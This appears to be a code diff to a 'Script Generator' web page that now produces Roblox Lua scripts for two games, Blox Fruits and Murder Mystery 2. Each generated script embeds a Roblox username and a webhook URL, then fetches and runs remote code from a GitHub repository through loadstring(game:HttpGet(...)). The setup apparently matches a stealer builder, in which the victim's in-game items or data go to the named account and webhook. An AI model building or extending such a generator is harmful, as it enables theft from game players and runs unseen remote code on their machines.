@@ -107,11 +107,12 @@
 <body>
     <h1>Script Generator</h1>
     <div class="container">
-        <button class="game-button" onclick="openPopup()">Blox Fruits</button>
+        <button class="game-button" onclick="openPopup('Blox Fruits')">Blox Fruits</button>
+        <button class="game-button" onclick="openPopup('Murder Mystery 2')">Murder Mystery 2</button>
     </div>
 
     <div id="popup" class="popup">
-        <h2>Enter Details</h2>
+        <h2 id="game-title">Enter Details for Game</h2>
         <input type="text" id="username" placeholder="Enter Roblox Username">
         <input type="text" id="webhook" placeholder="Enter Webhook URL">
         <button onclick="generateScript()">Generate Script</button>
@@ -121,17 +122,28 @@
     <div id="scriptOutput" class="script-output" style="display:none;"></div>
 
     <script>
-        function openPopup() {
+        let currentGame = '';
+
+        function openPopup(game) {
+            currentGame = game;
+            document.getElementById('game-title').innerText = `Enter Details for ${game}`;
             document.getElementById('popup').style.display = 'block';
         }
+
         function closePopup() {
             document.getElementById('popup').style.display = 'none';
         }
+
         function generateScript() {
             let username = document.getElementById('username').value;
             let webhook = document.getElementById('webhook').value;
             if (username && webhook) {
-                let script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Bloxfruits'))()`;
+                let script;
+                if (currentGame === 'Blox Fruits') {
+                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Bloxfruits'))()`;
+                } else if (currentGame === 'Murder Mystery 2') {
+                    script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/refs/heads/main/Void'))()`;
+                }
 
                 document.getElementById('scriptOutput').style.display = 'block';
                 document.getElementById('scriptOutput').textContent = script;
